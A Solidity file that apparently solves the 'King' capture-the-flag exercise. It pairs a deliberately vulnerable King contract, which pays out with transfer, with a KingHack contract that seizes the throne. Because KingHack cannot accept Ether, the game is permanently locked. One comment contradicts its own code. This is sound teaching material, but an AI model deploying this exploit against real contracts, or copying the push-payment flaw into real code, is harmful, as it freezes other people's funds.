// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingHack {
    constructor(address payable _target) payable {
        uint256 prize = King(_target).prize();
        (bool ok,) = _target.call{value: prize}("");
        require(ok, "Call Failed");
    }

    // // This function is needed to receive the Ether sent from the King contract
    // fallback() external payable {
    //     // Revert to prevent becoming the king if Ether is sent
    //     revert("KingHack does not accept Ether");
    // }
}